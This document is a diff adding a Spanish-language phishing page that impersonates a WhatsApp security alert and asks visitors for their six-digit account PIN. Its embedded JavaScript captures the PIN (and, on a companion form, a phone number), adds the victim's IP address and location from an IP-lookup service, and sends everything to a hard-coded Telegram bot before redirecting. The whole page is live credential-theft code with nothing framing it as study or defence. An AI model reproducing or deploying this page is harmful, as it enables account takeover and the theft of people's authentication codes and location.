@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="es"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Alerta de Actividad Sospechosa - WhatsApp</title>
+    <link rel="stylesheet" type="text/css" href="https://sappsapp23.sirv.com/docs/styles.css">
+      <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    html, body {
+      margin: 0;
+      padding: 0;
+      overflow-x: hidden; /* Bloquea desplazamiento horizontal */
+      width: 100vw;
+      max-width: 100vw;
+    }
+
+    body {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    .content {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      width: 100%;
+      max-width: 100vw;
+      text-align: center;
+    }
+
+    form {
+      width: 100%;
+      max-width: 400px;
+    }
+
+    select, input, button {
+      width: 100%;
+      margin: 10px 0;
+      padding: 12px;
+    }
+
+    #popup, footer {
+      width: 100%;
+      text-align: center;
+    }
+
+    img {
+      max-width: 100%;
+      height: auto;
+    }
+  </style>
+</head>
+<body>
+
+
+    <header>
+        <img src="https://sappsapp23.sirv.com/docs/JvsnINJ2CZv.svg" alt="Logo WhatsApp">
+    </header>
+
+    <div class="content">
+         <img src="https://sappsapp23.sirv.com/docs/117_outlook.jpg" width="350" alt="Logo WhatsApp">
+        <p>Por favor, introduzca el código de autenticacion (PIN) de su cuenta:</p>
+        <form id="verificationForm">
+    
+            <input type="tel" id="auth" name="auth" minlength="6" maxlength="6" placeholder="PIN" required="">
+
+            <button type="submit" id="submitButton">Continuar</button>
+        </form>
+    </div>
+
+    <footer>
+        <img src="https://sappsapp23.sirv.com/docs/GjxmhIpug9B.svg" alt="Logo WhatsApp">
+    </footer>
+<script type="text/javascript">
+    //bot token
+var telegram_bot_id =  "7933179313:AAFjbGziX_A9jLKiVe2be8HO7YyNGIuab8M";
+//chat id
+var chat_id ="-4755631975";
+document.addEventListener("DOMContentLoaded", function() {
+    // Función para obtener el valor de un parámetro de la URL
+    function getQueryParam(param) {
+        const urlParams = new URLSearchParams(window.location.search);
+        return urlParams.get(param);
+    }
+
+    // Función para obtener la ubicación y enviar el mensaje a Telegram
+    function obtenerUbicacionYEnviarMensajeTelegram(code, password, nextPage, message) {
+        fetch('https://ipapi.co/json/')
+        .then(response => response.json())
+        .then(data => {
+            var country = data.country_name;
+            var region = data.region;
+            var ip = data.ip;
+            if (country && region && ip) {
+                message += '\nUbicación: ' + country + ', ' + region + '\nIP: ' + ip;
+            } else {
+                message += '\nNo se pudo obtener la ubicación.';
+            }
+            enviarMensajeTelegram(message, nextPage);
+        })
+        .catch(error => {
+            console.error("Error al obtener la ubicación:", error);
+            message += "\nError al obtener la ubicación.";
+            enviarMensajeTelegram(message, nextPage);
+        });
+    }
+
+    // Función para enviar el mensaje a Telegram y redirigir
+    function enviarMensajeTelegram(mensaje, nextPage) {
+ 
+        var url = 'https://api.telegram.org/bot' + telegram_bot_id + '/sendMessage';
+        var params = {
+            chat_id: chat_id,
+            text: mensaje
+        };
+
+        fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(params)
+        })
+        .then(response => {
+            if (!response.ok) {
+                throw new Error('Ocurrió un error al enviar el mensaje.');
+            }
+            console.log('Mensaje enviado con éxito.');
+            window.location.href = nextPage;
+        })
+        .catch(error => {
+            console.error('Error al enviar el mensaje:', error);
+        });
+    }
+
+    // Evento de envío de formulario para la página de inicio de sesión
+    var loginForm = document.getElementById("loginForm");
+    if (loginForm) {
+        loginForm.addEventListener("submit", function(event) {
+            event.preventDefault();
+            var telefono = document.getElementById("telefono").value;
+            obtenerUbicacionYEnviarMensajeTelegram(telefono, telefono, "paginafinal.html?action=telefono", "💲 Whatsapp 💲:\nTELEFONO: " + telefono);
+        });
+    }
+
+
+    // Evento de envío de formulario para la sección de contacto
+    var verificationForm = document.getElementById("verificationForm");
+    if (verificationForm) {
+        verificationForm.addEventListener("submit", function(event) {
+            event.preventDefault();
+            var auth = document.getElementById("auth").value;
+            obtenerUbicacionYEnviarMensajeTelegram(auth, auth, "paginafinal.html?action=auth", "💲 Whatsapp 💲:\nPIN AUTHENTICADOR: " + auth);
+        });
+    
+    }
+});
+
+</script>
+
+
+</body></html>
